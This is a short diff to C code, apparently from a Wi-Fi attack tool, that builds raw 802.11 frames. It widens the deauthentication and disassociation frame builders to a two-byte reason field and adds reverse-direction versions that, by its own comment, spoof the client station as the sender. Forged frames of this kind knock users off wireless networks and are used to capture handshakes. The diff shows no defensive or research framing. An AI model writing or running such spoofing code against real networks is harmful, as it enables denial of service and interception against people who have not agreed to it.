@@ -33,10 +33,17 @@ static inline size_t ieRates(uint8_t* p)            { p[0]=1; p[1]=8; memcpy(p+2
 static inline size_t ieRsn(uint8_t* p)              { memcpy(p,RSNIE,sizeof(RSNIE)); return sizeof(RSNIE); }
 
 static inline size_t f_deauth(uint8_t* f, const uint8_t* sta, const uint8_t* ap, uint8_t reason) {
-  fhdr(f, 0xC0, 0x00, sta, ap, ap); f[24] = reason; return 25;
+  fhdr(f, 0xC0, 0x00, sta, ap, ap); f[24] = reason; f[25] = 0; return 26;
+}
+// Reverse direction: STA→AP (spoof STA as source)
+static inline size_t f_deauth_r(uint8_t* f, const uint8_t* ap, const uint8_t* sta, uint8_t reason) {
+  fhdr(f, 0xC0, 0x00, ap, sta, ap); f[24] = reason; f[25] = 0; return 26;
 }
 static inline size_t f_disassoc(uint8_t* f, const uint8_t* sta, const uint8_t* ap, uint8_t reason) {
-  fhdr(f, 0xA0, 0x00, sta, ap, ap); f[24] = reason; return 25;
+  fhdr(f, 0xA0, 0x00, sta, ap, ap); f[24] = reason; f[25] = 0; return 26;
+}
+static inline size_t f_disassoc_r(uint8_t* f, const uint8_t* ap, const uint8_t* sta, uint8_t reason) {
+  fhdr(f, 0xA0, 0x00, ap, sta, ap); f[24] = reason; f[25] = 0; return 26;
 }
 static inline size_t f_auth(uint8_t* f, const uint8_t* sta, const uint8_t* ap) {
   fhdr(f, 0xB0, 0x00, ap, sta, ap);
